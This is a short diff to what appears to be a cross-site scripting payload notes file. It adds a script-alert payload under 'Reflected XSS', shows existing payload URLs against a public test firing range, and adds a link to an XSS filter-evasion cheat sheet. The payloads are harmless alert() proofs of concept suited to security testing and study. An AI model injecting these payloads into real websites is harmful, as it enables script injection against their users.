@@ -6,6 +6,8 @@ user-agent.me
 
 [Reflected XSS]
 
+- <script>alert('XSS FOUND!');</script> 
+
 - http://public-firing-range.appspot.com/reflected/parameter/title?q=%3C/title%3E%3Csvg%20onload=alert%28%222%22%29%3E
 
 - http://public-firing-range.appspot.com/reflected/parameter/title?q=<script>alert("Hacked")</script>
@@ -28,3 +30,8 @@ user-agent.me
 	<script>alert(document.getElementById('x').innerHTML)</script>
 
 [Relative Path overwrite XSS- RPO]
+
+
+[OWASP XSS FIlters Evation]
+
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
